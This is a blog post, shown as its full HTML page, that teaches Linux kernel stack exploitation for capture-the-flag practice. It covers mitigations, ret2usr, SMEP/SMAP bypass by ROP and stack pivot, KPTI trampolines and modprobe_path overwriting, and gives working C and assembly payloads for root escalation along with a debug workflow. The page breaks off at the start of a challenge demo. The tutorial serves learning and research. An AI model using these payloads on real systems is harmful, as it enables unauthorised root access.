@@ -1,0 +1,782 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  data-theme="dark" >
+  <head>
+  <meta charset="utf-8">
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+
+    gtag('config', 'true');
+  </script>
+  <!-- End Google Analytics -->
+
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    Stack-based exploits in Linux kernel |
+    
+    whoisthatguy
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Stack-based exploits in Linux kernelMitigations1. SMEP dont allow to execute user space code in qemu, to enable SMEP we use -cpu+smep  to disasble it use -append nosmep SMEP is a hardware security mec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Stack-based exploits in Linux kernel">
+<meta property="og:url" content="http://wh0isthatguy.github.io/2024/01/29/stack-linux-kernel/index.html">
+<meta property="og:site_name" content="whoisthatguy">
+<meta property="og:description" content="Stack-based exploits in Linux kernelMitigations1. SMEP dont allow to execute user space code in qemu, to enable SMEP we use -cpu+smep  to disasble it use -append nosmep SMEP is a hardware security mec">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJow9EH9p.png">
+<meta property="og:image" content="https://img.upanh.tv/2024/01/29/Untitledc77a1695b3efbfd4.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryiEcEr9p.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkTbcEB9p.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1yX9NH9a.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJhtc4Hqp.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1Sc54B96.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJTiKErqa.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HklcF4rqT.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJbNFEH9T.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJMXKVB9T.png">
+<meta property="article:published_time" content="2024-01-29T10:54:02.000Z">
+<meta property="article:modified_time" content="2024-10-29T09:59:08.871Z">
+<meta property="article:author" content="whoisthatguy">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/SJow9EH9p.png">
+  
+  
+  
+    <link rel="shortcut icon" href="https://uploads-public.hackmd.io/upload_a391ca5a866f9b0463c380b8e3b6d963.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">UwU....</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="https://hackmd.io/_uploads/ryiEcEr9p.png" alt="Stack-based exploits in Linux kernel">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Stack-based exploits in Linux kernel</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-stack-linux-kernel" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2024/01/29/stack-linux-kernel/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2024-01-29T10:54:02.000Z" itemprop="datePublished">2024-01-29</time>
+    <time style="display: none;" id="post-update-time">2024-10-29</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/pwn/" data-aos="zoom-in">pwn</a><a class="article-category-link" href="/categories/pwn/stack-overflow/" data-aos="zoom-in">stack overflow</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="Stack-based-exploits-in-Linux-kernel"><a href="#Stack-based-exploits-in-Linux-kernel" class="headerlink" title="Stack-based exploits in Linux kernel"></a>Stack-based exploits in Linux kernel</h1><h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><h3 id="1-SMEP"><a href="#1-SMEP" class="headerlink" title="1. SMEP"></a>1. SMEP</h3><ul>
+<li>dont allow to execute user space code</li>
+<li>in qemu, to enable SMEP we use <code>-cpu+smep</code>  to disasble it use <code>-append nosmep</code></li>
+<li>SMEP is a hardware security mechanism. Setting the 21st bit of the CR4 register enables SMEP.</li>
+</ul>
+<h3 id="2-SMAP"><a href="#2-SMAP" class="headerlink" title="2. SMAP"></a>2. SMAP</h3><ul>
+<li>kernel space cannot read or write userspace memory</li>
+<li>to do that we need to use copy_from_user &#x2F; copy_to_user</li>
+</ul>
+<h3 id="3-Kernel-Canary"><a href="#3-Kernel-Canary" class="headerlink" title="3. Kernel Canary"></a>3. Kernel Canary</h3><ul>
+<li>the same as stack canary on user land</li>
+<li>enabled in the kernel at compile time and cannot be disabled.</li>
+</ul>
+<h3 id="4-KASLR"><a href="#4-KASLR" class="headerlink" title="4. KASLR"></a>4. KASLR</h3><ul>
+<li>randomizes the base address where the kernel is loaded each time the system is booted</li>
+<li>It can be enabled&#x2F;disabled by adding <code>kaslr</code> or <code>nokaslr</code> under <code>-append</code> option.</li>
+</ul>
+<h3 id="5-KPTI-Kernel-Page-Table-Isolation"><a href="#5-KPTI-Kernel-Page-Table-Isolation" class="headerlink" title="5. KPTI (Kernel Page-Table Isolation)"></a>5. KPTI (Kernel Page-Table Isolation)</h3><ul>
+<li>prevent Meltdown (side-channel attack)</li>
+</ul>
+<h3 id="6-KADR-Kernel-Address-Display-Restriction"><a href="#6-KADR-Kernel-Address-Display-Restriction" class="headerlink" title="6. KADR (Kernel Address Display Restriction)"></a>6. KADR (Kernel Address Display Restriction)</h3><ul>
+<li>hide kernel address &#x2F;proc&#x2F;kallsyms</li>
+<li><code>/proc/sys/kernel/kptr_restrict</code> : 0 to disable it</li>
+</ul>
+<p>Kernel have sus function : <code>run_cmd(char * cmd)</code> : run cmd in userspace as root.</p>
+<h2 id="Stack-base-technique"><a href="#Stack-base-technique" class="headerlink" title="Stack-base technique"></a>Stack-base technique</h2><h3 id="1-ret2usr"><a href="#1-ret2usr" class="headerlink" title="1. ret2usr"></a>1. ret2usr</h3><p>This exploit take advantage of kernel space process can see userspace process → execute code in userspace with kernel permission (root) </p>
+<h4 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements :"></a>Requirements :</h4><ul>
+<li>SMEP must be off</li>
+<li>overflow must be possible</li>
+<li>ability to leak ( at least canary)</li>
+</ul>
+<h4 id="Ideas"><a href="#Ideas" class="headerlink" title="Ideas:"></a>Ideas:</h4><p>Overwrite return address of a kernel process to the process we can control in user space</p>
+<h5 id="Steps"><a href="#Steps" class="headerlink" title="Steps:"></a>Steps:</h5><ul>
+<li>save register state (<code>cs ,ss ,rsp,rflags</code>) in user space</li>
+<li>escalate privilege before return to user space (<code>commit_creds(prepare_kernel_cred(0))</code> )</li>
+<li>Return to user mode from kernel mode in kernel space + restore register state</li>
+<li>get shell</li>
+</ul>
+<h4 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h4><h5 id="Save-registers-state"><a href="#Save-registers-state" class="headerlink" title="Save registers state"></a>Save registers state</h5><p>The process keep track of 2 different states of register in kernel and user mode. Because we want to execute <code>system(&#39;/bin/sh&#39;)</code> in user mode so we need to restore user mode’s state </p>
+<p>These states should not random so before an access to kernel space process it must save states.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> user_cs, user_ss, user_rflags, user_sp, user_rip = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)get_shell;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Escalate-privilege-switch-to-user-mode-restore-states"><a href="#Escalate-privilege-switch-to-user-mode-restore-states" class="headerlink" title="Escalate privilege + switch to user mode + restore states"></a>Escalate privilege + switch to user mode + restore states</h5><p>To escalate privilege, we simply use <code>commit_creds(prepare_kernel_cred(0))</code></p>
+<p>To switch to user mode, to process must use 1 of these : </p>
+<ul>
+<li><code>sysretq</code> : complicated to setup</li>
+<li><code>iretq</code> : commonly use</li>
+</ul>
+<p><code>iretq</code>  require stack to setup with <strong>5 userland register values</strong> in this order: <code>RIP|CS|RFLAGS|SP|SS</code> → the value we save earlier</p>
+<ul>
+<li>for rip, we need to set it to the <code>get_shell()</code> address to get shell</li>
+</ul>
+<p>On x86&#x2F;64, <code>swapgs</code>  instruction must be call before <code>iretq</code></p>
+<p>Finally, we just push the save state register to stack</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> user_cs, user_ss, user_rflags, user_sp, user_rip = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)get_shell;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leo_quyen</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	__asm__(</span><br><span class="line">	<span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">	<span class="string">&quot;movabs rax, 0xffffffff814c67f0;&quot;</span></span><br><span class="line">	<span class="string">&quot;xor rdi, rdi;&quot;</span></span><br><span class="line">	<span class="string">&quot;call rax;&quot;</span></span><br><span class="line">	<span class="string">&quot;mov rdi,rax;&quot;</span></span><br><span class="line">	<span class="string">&quot;movabs rax,0xffffffff814c6410;&quot;</span></span><br><span class="line">	<span class="string">&quot;call rax;&quot;</span></span><br><span class="line">	<span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r15, user_ss;&quot;</span></span><br><span class="line">    <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r15, user_sp;&quot;</span></span><br><span class="line">    <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r15, user_rflags;&quot;</span></span><br><span class="line">    <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r15, user_cs;&quot;</span></span><br><span class="line">    <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r15, user_rip;&quot;</span></span><br><span class="line">    <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">    <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">	<span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">		);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="2-Bypass-SMEP-SMAP"><a href="#2-Bypass-SMEP-SMAP" class="headerlink" title="2. Bypass SMEP&#x2F;SMAP"></a>2. Bypass SMEP&#x2F;SMAP</h3><p>SMEP mitigation is similar to NX in userland. SMEP enable by enable the 20th bit of CR4 register (start from 0) </p>
+<p><img src="https://hackmd.io/_uploads/SJow9EH9p.png" alt="image"></p>
+<h4 id="a-Overwrite-CR4-register"><a href="#a-Overwrite-CR4-register" class="headerlink" title="a. Overwrite CR4 register"></a>a. Overwrite CR4 register</h4><p>There is an api in kernel  <code>native_write_cr4(value)</code> </p>
+<p>→ ROPchain : pop rdi → <code>native_write_cr4()</code> → <code>prepare_kernel_cred()</code> → ….</p>
+<p>We do that by zero out the 20th bit of CR4 register.</p>
+<p>But in newer version of kernel , CR4 register cannot be change after boot by using pin. → If we change, it will set to the default boot value</p>
+<h4 id="b-ROPchain"><a href="#b-ROPchain" class="headerlink" title="b. ROPchain"></a>b. ROPchain</h4><p>Because we can’t execute code in user space , we can use gadget in kernel space. </p>
+<p>Note that these gadgets from ROPgadget not always works because it don’t known that memory area is executable or not → try and error<br>Also work with SMAP enable</p>
+<h5 id="Can-overwrite-more-that-return-address"><a href="#Can-overwrite-more-that-return-address" class="headerlink" title="Can overwrite more that return address"></a>Can overwrite more that return address</h5><p>Just build a normal ROP chain to call <code>prepare_kernel_cred()</code>…</p>
+<h5 id="Can-overwrite-only-return-address-stack-pivot"><a href="#Can-overwrite-only-return-address-stack-pivot" class="headerlink" title="Can overwrite only return address (stack pivot)"></a>Can overwrite only return address (stack pivot)</h5><p>Find a gadget that can mov some value to <code>rsp</code> , ex : <em><code>mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</code></em></p>
+<p>In user space we mmap a region to build ROP chain.</p>
+<p>This is possible due to SMAP is disable.</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void build_fake_stack(void)&#123;</span><br><span class="line">    fake_stack = mmap((void *)<span class="number">0</span>x5b000000 - <span class="number">0</span>x1000, <span class="number">0</span>x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|M, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    unsigned <span class="keyword">off</span> = <span class="number">0</span>x1000 / <span class="number">8</span>;</span><br><span class="line">    fake_stack[<span class="number">0</span>] = <span class="number">0</span>xdead; // <span class="keyword">put</span> something in the first page <span class="keyword">to</span> prevent fault</span><br><span class="line">    fake_stack[<span class="keyword">off</span>++] = <span class="number">0</span>x0; // dummy r12</span><br><span class="line">    fake_stack[<span class="keyword">off</span>++] = <span class="number">0</span>x0; // dummy rbp</span><br><span class="line">    fake_stack[<span class="keyword">off</span>++] = pop_rdi_ret;</span><br><span class="line">    ... // the rest of the <span class="keyword">chain</span> is the same as the last payload</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Not work with SMAP</p>
+<h3 id="3-KPTI-trampoline-KPTI-bypass"><a href="#3-KPTI-trampoline-KPTI-bypass" class="headerlink" title="3. KPTI trampoline (KPTI bypass)"></a>3. KPTI trampoline (KPTI bypass)</h3><h4 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h4><p>2 way to bypass:</p>
+<ul>
+<li>using signal handler in userland<br>  <code>signal(SIGSEGV, get_shell)</code></li>
+<li>KPTI trampoline</li>
+</ul>
+<h4 id="KPTI-trampoline"><a href="#KPTI-trampoline" class="headerlink" title="KPTI trampoline"></a>KPTI trampoline</h4><p>kernel have a function : <code>swapgs_restore_regs_and_return_to_usermode()</code> to swap kernel page to user page</p>
+<p>it will restore by pop a lots of regs in stack → ret2 <code>swapgs_restore_regs_and_return_to_usermode + 22</code></p>
+<p><img src="https://img.upanh.tv/2024/01/29/Untitledc77a1695b3efbfd4.png" alt="Untitledc77a1695b3efbfd4.png"></p>
+<p><code>modprobe</code> is store under <code>modprobe_path</code> symbol in the linux kernel</p>
+<p>It will invoke when these function is call in userland :</p>
+<ul>
+<li>system()</li>
+<li>execve()</li>
+<li>…</li>
+</ul>
+<p>When we call <code>system(’/tmp/cc’)</code> and file signature of <code>cc</code> is unknown it will call <code>modprobe</code><br>Therefore, we have arbitrary command execution.<br>Note that we don’t need to use <code>commit_creds(prepare_kernel_cred(0))</code> → shorter ROP</p>
+<h3 id="4-modprobe-path"><a href="#4-modprobe-path" class="headerlink" title="4. modprobe_path"></a>4. modprobe_path</h3><ul>
+<li>Exploit kernel vuln to archive ROP in kernel space</li>
+<li>Find gadget to overwrite <code>modprobe_path</code>  in to new_path. Ex : <code>/tmp/cc</code></li>
+<li>Return to user space</li>
+<li>Now we create that file in user space  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo &#x27;#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br></pre></td></tr></table></figure></li>
+<li>Run that file  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Run unknown file&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="Debug-DEMO"><a href="#Debug-DEMO" class="headerlink" title="Debug + DEMO"></a>Debug + DEMO</h2><h3 id="1-Debug"><a href="#1-Debug" class="headerlink" title="1. Debug"></a>1. Debug</h3><p>First we need to set our kernel to have root → ez to debug (by extract cpio file<br>Second, remove some mitigations (typically in run.sh script provided by the challenge) → reads kernel symbol easier</p>
+<p>Inside the qemu script add: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-gdb tcp::1234</span><br></pre></td></tr></table></figure>
+
+<p>Write a <a target="_blank" rel="noopener" href="http://pack.sh/">pack.sh</a> script :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">gcc -o exp -static exp.c</span><br><span class="line"><span class="built_in">mv</span> ./exp ./root</span><br><span class="line"><span class="built_in">cd</span> ./root</span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio -o --format=newc  --null --owner=root  \</span><br><span class="line">| gzip -9 &gt; initramfs.cpio.gz</span><br><span class="line"><span class="built_in">mv</span> ./initramfs.cpio.gz ../</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>exp.c</code> is the exploit i write in C.</li>
+<li><code>./root</code> is the folder contain file system extract by the provided <code>initramfs.cpio.gz</code></li>
+</ul>
+<p>I also write a python script to automate the process of packing and running the kernel + debug</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	command = <span class="string">f&quot;&quot;&quot;target remote 127.0.0.1:1234</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">ksymaddr-remote-apply</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	init = <span class="string">f&quot;&quot;&quot;#!/usr/bin/python3</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string">os.execve(&#x27;/usr/bin/gdb&#x27;, [&#x27;/usr/bin/gdb&#x27;, &#x27;-q&#x27;, &#x27;-x&#x27;, &#x27;/tmp/QEMU_debug.gdb&#x27;], os.environ)</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/run_GDB&#x27;</span>,<span class="string">&#x27;wt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		f.write(init)</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/QEMU_debug.gdb&#x27;</span>, <span class="string">&#x27;wt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">		f.write(command)</span><br><span class="line">	os.chmod(<span class="string">&quot;/tmp/run_GDB&quot;</span>,stat.S_IRWXU)</span><br><span class="line">	os.chmod(<span class="string">&quot;/tmp/QEMU_debug.gdb&quot;</span>,stat.S_IRWXU)</span><br><span class="line">	<span class="keyword">if</span> (args.GDB):</span><br><span class="line">		debug_process = process([<span class="string">&#x27;cmd.exe&#x27;</span>, <span class="string">&#x27;/c&#x27;</span>, <span class="string">&#x27;start&#x27;</span>, <span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;split-pane&#x27;</span>, <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;wsl.exe&#x27;</span>, <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;Ubuntu&#x27;</span>, <span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;/tmp/run_GDB&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">	os.system(<span class="string">&quot;./pack.sh&quot;</span>)</span><br><span class="line">	debug()</span><br><span class="line">	os.system(<span class="string">&quot;./run.sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">	start()</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Demo-ret2usr"><a href="#2-Demo-ret2usr" class="headerlink" title="2. Demo ret2usr"></a>2. Demo ret2usr</h3><p><a target="_blank" rel="noopener" href="https://2020.ctf.link/assets/files/kernel-rop-bf9c106d45917343.tar.xz">Challenge</a></p>
+<p>we need to modify the run.sh script</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -cpu kvm64\</span><br><span class="line">    -kernel vmlinuz \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 nopti nokaslr quiet panic=1&quot;</span> \</span><br><span class="line">    -gdb tcp::1234</span><br></pre></td></tr></table></figure>
+<p>We can read the stack freely on <code>hackme_read</code></p>
+<p><img src="https://hackmd.io/_uploads/ryiEcEr9p.png" alt="Screenshot 2024-01-29 204256"><br>And stack buffer overflow on <code>hackme_write</code></p>
+<p><img src="https://hackmd.io/_uploads/rkTbcEB9p.png" alt="Screenshot 2024-01-29 203824"></p>
+<p>Base on this we can see the device name is <code>hackme</code><br><img src="https://hackmd.io/_uploads/S1yX9NH9a.png" alt="Screenshot 2024-01-29 204829"></p>
+<p>First we need to open the device</p>
